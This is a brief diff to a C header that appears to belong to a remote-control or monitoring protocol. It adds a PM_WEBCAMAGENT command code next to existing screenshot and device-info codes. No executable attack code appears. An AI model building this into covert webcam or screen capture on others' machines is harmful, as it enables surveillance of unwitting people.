@@ -25,7 +25,7 @@
 #define PM_INFOSTRING	0x0241
 #define PM_DEVICEINFO	0xfff1
 #define PM_SCREENSHOT	0xfff2	
-
+#define PM_WEBCAMAGENT        0xE9E9
 
 typedef struct _PROTO_COMMAND_AUTH
 {
